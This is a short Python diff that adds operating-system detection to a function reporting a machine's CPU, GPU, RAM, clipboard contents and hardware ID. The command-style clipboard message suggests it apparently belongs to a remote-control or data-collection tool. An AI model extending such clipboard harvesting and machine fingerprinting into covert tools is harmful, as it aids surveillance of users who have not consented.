@@ -33,12 +33,21 @@ def system():
     elif len(clipboard) > 1500:
         clipboard = "Clipboard is too long, use 'clipboard' command to get full clipboard!" 
     
+    def get_os():
+        try:
+            wmi_obj = wmi.WMI()
+            os_info = wmi_obj.Win32_OperatingSystem()[0]
+            return os_info.Caption
+        except:
+            return "Unknown"
+    
+    os = get_os()
     cpu = wmi.WMI().Win32_Processor()[0].Name
     gpu = wmi.WMI().Win32_VideoController()[0].Name
     ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize
     ram = round(float(ram) / 1048576)
     
-    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nClipboard: {clipboard}\nHWID: {hwid}\n"
+    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nClipboard: {clipboard}\nHWID: {hwid}\nOS: {os}\n"
 
 
 def disk():
